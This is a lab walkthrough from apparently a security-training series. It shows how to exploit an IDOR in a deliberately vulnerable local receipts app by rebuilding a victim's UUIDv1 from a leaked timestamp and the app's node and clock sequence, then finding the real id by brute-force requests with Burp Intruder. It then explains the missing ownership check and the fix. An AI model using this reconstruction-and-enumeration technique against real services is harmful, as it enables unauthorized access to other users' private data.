# Walkthrough — idor-uuid-guessable

## 1. Context

The app is a small "receipts" service. Every receipt has an owner, an item, an amount, and an `issued_at` timestamp, and each one lives at its own private link: `GET /receipt/<uuid>`. The developer's mental model is that the UUID in that link *is* the protection — the id is long and random-looking, so "only someone who was given the link can open the receipt." A dashboard at `GET /` lists every receipt's owner and issue time, which the developer treats as harmless metadata; the sensitive detail sits behind the unguessable link.

You are going to read another user's receipt without ever being given her link — by reconstructing her UUID from data the app hands you. And then, at the end, you'll see you didn't need to reconstruct anything: the endpoint never checks who is asking, so any valid id would have done. Two layers, one root cause — there is no authorization check.

This is the same class as `idor-numeric-id`, deliberately so. There, the id was a sequential integer and the "exploit" was counting `1, 2, 3`. The obvious-but-wrong lesson from that atom is "don't use guessable ids — use UUIDs." This atom is the rebuttal: the id *is* a UUID, and it changed nothing, because enumerability was never the disease. The missing ownership check is.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/receipt/<uuid>` view is short:

```python
@app.route("/receipt/<uuid:receipt_id>")
def view_receipt(receipt_id):
    r = RECEIPTS.get(str(receipt_id))
    if r is None:
        abort(404)
    # VULNERABLE: no ownership check ...
    return render_template("receipt.html", receipt=r)
```

Read it twice. It looks up a receipt by id and returns it. Nothing concatenates input into a dangerous sink; there is no risky template filter. The bug is **what isn't there**: no comparison between `r["owner"]` and the calling user. The function trusts that "if you asked for this receipt, you must be allowed to see it" — and holding a UUID is treated as proof of that. It isn't.

As in `idor-numeric-id`, this class doesn't `grep`. There is no `f"`, no `|safe`, no `eval` to find. You audit it by reading endpoints that return user-scoped objects and asking, for each: **where does this verify the caller owns the object?** Here the answer is "nowhere."

Note the render is autoescaped (`{{ }}` with no `|safe`), including the `X-User-ID` echoed on the dashboard. That escaping is not the IDOR fix — it is hygiene to keep this atom to exactly one bug (an unescaped, attacker-controlled header would stack a reflected XSS on top). The one bug here is the missing check.

## 3. How auth works in this lab

Real auth is out of scope (see the README). As in `idor-numeric-id`, we fake "who is logged in" with a single self-asserted header, **`X-User-ID`**. Two users are seeded:

- **`mallory`** — the attacker (you). If you send no header, the app treats you as `mallory`.
- **`alice`** — the victim, whose receipt is seeded at startup.

Two things to hold in mind: the header is self-asserted (you can claim any identity), and — the crux — the vulnerable `/receipt/<uuid>` view never reads it at all. Step 5 makes that concrete.

## 4. Exploitation via Burp Suite (primary track)

Point your browser at Burp, visit <http://127.0.0.1:8011/>, and send the requests below from Repeater. Burp plants and varies the requests; the one piece Burp can't do — the arithmetic that turns a timestamp back into a UUID — is a dozen lines of Python you run alongside it.

> **The values below are from one real session.** A UUIDv1 embeds the wall-clock time it was minted, and the generator draws a fresh clock sequence each time the container boots, so your ids and timestamps *will differ*. The chain is identical and reproducible — only the exact hex changes.

### Baseline — mint and read your own receipt

Create a receipt as yourself:

```
POST /receipt HTTP/1.1
Host: 127.0.0.1:8011
X-User-ID: mallory
Content-Length: 0
```

The response renders your receipt. Its id is a **UUIDv1** (example values — yours will differ):

```
Receipt id: 184dae7c-7ba1-11f1-b8a9-56b2c594786d
Issued at:  2026-07-09T14:18:45.289126+00:00
Owner:      mallory
```

Read it back to confirm the feature works — `GET /receipt/<your-id>` (the id your own POST just returned) with `X-User-ID: mallory` returns 200 and your receipt. Keep this id: it is your sample of the generator.

### Step 1 — Read the metadata the app leaks

Request the dashboard:

```
GET / HTTP/1.1
Host: 127.0.0.1:8011
```

The overview table lists every receipt's owner and `issued_at` — including alice's, at microsecond precision, and **without her UUID**:

```
Owner    Issued at
alice    2026-07-09T14:16:02.668144+00:00
mallory  2026-07-09T14:18:45.289126+00:00
```

You don't have alice's receipt link. But you now have her exact issue time and (from the Baseline) a UUIDv1 minted by the same process. That is enough.

### Step 2 — Recover the generator's fingerprint (node + clock_seq)

A UUIDv1 is not random. It is `timestamp | clock_sequence | node`, and Python exposes each field. Parse your own id:

```python
import uuid
mine = uuid.UUID("<your-receipt-id>")   # the id from your own POST (Baseline)
print(hex(mine.node), mine.clock_seq)   # example: 0x56b2c594786d 14505 — yours will differ
```

`node` (here the container's MAC) and `clock_seq` are **process constants** — the app fixes both for the life of the process — so alice's id carries the *same* `node` and `clock_seq` as yours. You can even see it by eye: your id ends `-b8a9-56b2c594786d`, and so will hers. Only the time fields differ between the two.

> **Sub-lesson.** That the `clock_seq` is stable is the app being *faithful to RFC 4122*, which says to pick a random clock sequence and then persist it. Python's `uuid.uuid1()` happens to draw a fresh random `clock_seq` on every call — an accidental mitigation that would have blocked this step. Following the standard here makes the id *more* predictable, not less.

### Step 3 — Reconstruct the victim's UUID (~10 candidates)

You know alice's `node` and `clock_seq` (Step 2) and her `issued_at` to the microsecond (Step 1). A v1 timestamp counts 100-nanosecond ticks, so one microsecond is ten ticks: fixing the time to the microsecond leaves exactly one unknown digit — **ten candidate UUIDs**.

You would not hand-build these during an engagement. The move in the field is to *recognize* the id as a version-1 UUID — read the version nibble, the digit that opens the third group (the `1` in `...-11f1-...`) — and point a ready-made UUIDv1 tool at it, such as [`guidtool`](https://github.com/intruder-io/guidtool): give it a sample id (yours) and the target's approximate `issued_at`, and it enumerates the candidates for you. The snippet below is the same field-packing arithmetic such a tool runs under the hood, shown raw so you understand *why* a v1 is reconstructible — the project's habit of working the mechanics by hand, like the `UNION` in `sqli-union-basic`:

```python
import uuid
from datetime import datetime, timezone, timedelta

UUID_EPOCH_100NS = 0x01b21dd213814000
UNIX_EPOCH = datetime(1970, 1, 1, tzinfo=timezone.utc)

mine = uuid.UUID("<your-receipt-id>")        # the id your own POST returned (Baseline)
node, clock_seq = mine.node, mine.clock_seq                  # process constants

issued_at = datetime.fromisoformat("<alices-issued-at-from-the-dashboard>")  # copy alice's row from GET /
us = (issued_at - UNIX_EPOCH) // timedelta(microseconds=1)
base = us * 10 + UUID_EPOCH_100NS

def build_v1(t, node, clock_seq):
    fields = (t & 0xffffffff, (t >> 32) & 0xffff, (t >> 48) & 0x0fff,
              (clock_seq >> 8) & 0x3f, clock_seq & 0xff, node)
    return uuid.UUID(fields=fields, version=1)

for d in range(10):
    print(build_v1(base + d, node, clock_seq))
```

Example output from the validation session — ten UUIDs that differ only in the last time digit (**yours will be different**):

```
b75fb060-7ba0-11f1-b8a9-56b2c594786d
b75fb061-7ba0-11f1-b8a9-56b2c594786d
...
b75fb069-7ba0-11f1-b8a9-56b2c594786d
```

One of these is alice's real receipt id. (In this session it was the fifth, `...b75fb064...`; yours will land on a different digit.)

### Step 4 — Access the victim's receipt (IDOR confirmed)

You now hold ten candidate ids and you do **not** know which one is alice's — finding that out *is* the attack, and the server itself is the oracle that answers it. You don't compare hex or inspect the ids; you send all ten to the private endpoint and watch the status codes.

The clean way to fire all ten at once is **Burp Intruder**: send the request there, mark the id in the path as the single payload position (wrap it in Intruder's `§` markers — `GET /receipt/§...§`), pick the Sniper attack, paste the ten candidates as a simple payload list, and Start attack. (Repeater works too — edit the last digit and resend, ten times.) A candidate request looks like:

```
GET /receipt/<candidate> HTTP/1.1
Host: 127.0.0.1:8011
X-User-ID: mallory
```

Sort the results by status: nine ids aren't in the store and come back **404**; the one real id comes back **200**. The status code is the only signal that differs — you never compared ids, you just watched which request opened a receipt. Open the 200 and you are looking at alice's receipt, a record you were never given the link to:

```
Receipt id: b75fb064-7ba0-11f1-b8a9-56b2c594786d   (example — yours differs)
Owner:      alice
Item:       Noise-cancelling headphones
Amount:     $1,299.00
Issued at:  2026-07-09T14:16:02.668144+00:00
```

That is the IDOR. You read another user's receipt without ever being given its link — you rebuilt the candidates from a timestamp on a dashboard and a UUID of your own, and the server itself told you which candidate was real. The `issued_at` on the 200 matches alice's dashboard row exactly, confirming you hit her record.

### Step 5 — Prove the bug is "missing check", not "guessable id"

The reconstruction is dramatic, but it can mislead you into thinking the bug is "the UUID was guessable." It isn't. Keep the path on **your own** receipt — an id you legitimately hold — and change only the header, claiming to be alice:

```
GET /receipt/<your-id> HTTP/1.1
Host: 127.0.0.1:8011
X-User-ID: alice
```

Response: **200, still your own receipt (owner `mallory`), unchanged.** Send it again as `X-User-ID: mallory` — identical. The view never reads `X-User-ID`; there is no identity to spoof and nothing the header changes.

Sit with what that proves, in two layers:

- **Layer 1 — obscurity was never the control.** The endpoint doesn't check who you are, so *any* id you hold — however random — is served. That is why switching to a `uuid4` on its own would not fix this: v4 changes how hard the id is to *guess*, not whether the server *checks ownership*. The moment an attacker obtains a valid id — a shared link, a `Referer` header, a log line, browser history — the receipt is theirs.
- **Layer 2 — and this id wasn't even hard to guess.** Steps 2–4 rebuilt it from a timestamp and a node the app volunteered.

One root cause underneath both: there is no authorization check.

## 5. Why this is IDOR, and why the UUID never helped

In `idor-numeric-id` we said, of that atom's fix, that changing the integer to a UUID would be *"obfuscation... theater"* — that "UUIDs, signed tokens, hidden URLs, rate limits ... only change how hard the bug is to *find*." This atom stages that play: the id **is** a UUID, and it changed nothing, because the missing check — not the id's shape — was always the bug. Worse, a UUIDv1 hands its own timestamp and node back to you, so it isn't even the random secret people assume.

| Atom (A01) | Object reached by… | The id is… | Missing check |
|---|---|---|---|
| `idor-numeric-id` | changing an id (`/notes/1` → `/notes/2`) | sequential integer | ownership (is the note yours?) |
| `idor-uuid-guessable` | reconstructing and using the UUID | **reconstructible UUIDv1** | ownership (is the receipt yours?) — **the same check** |
| `path-traversal-basic` | navigating the filesystem (`notes.txt` → `../../etc/passwd`) | file path | confinement (did the path stay in the folder?) |

All three are "the app handed you something that wasn't yours." `idor-numeric-id` and this atom share the exact same cause and the exact same fix — an ownership check — and differ only in the id's shape, which is precisely the point. `path-traversal-basic` is the same family by a different axis (confining a path rather than owning an object).

## 6. Impact

Horizontal privilege escalation: you read another same-level user's receipt — her item, her amount, her purchase time. That is the honest ceiling. **It is not RCE, and not vertical escalation** — you gained no code execution and no elevated role. In a real target, receipt/order data is often PII that *chains* into further attacks, but the finding itself is the cross-user read.

## 7. Why the fix works

Run the whole chain against the fixed app on port **8111** (see [`DIFF.md`](./DIFF.md) for the change):

- **The ownership check (the fix that matters).** Mint a receipt there as `mallory`, then request it with `X-User-ID: alice`: **403 Forbidden**. You hold a perfectly valid id and are still refused, because the fixed view compares `r["owner"]` to the caller before returning. Requesting it as `mallory` returns 200. This single check closes the IDOR.
- **UUIDv4 (defense-in-depth).** The fixed app mints ids with `uuid4` — drawn from a CSPRNG, with no embedded timestamp or node — so the id you get back is a v4 and Step 3's reconstruction has nothing to work from. But note what this does *not* do on its own: keep the missing check and only swap the generator, and any id an attacker obtains still opens the receipt. The generator swap closes the *reconstruction* route; the check closes the *access*.
- **The dashboard still leaks `issued_at`**, byte-for-byte as before. It's now inert — v4 can't be rebuilt from a timestamp, and the check would refuse the access regardless. Proof that the metadata leak was never the vulnerability.

The order is the lesson: **the ownership check is the fix; UUIDv4 is defense-in-depth.** Reach for the check first.
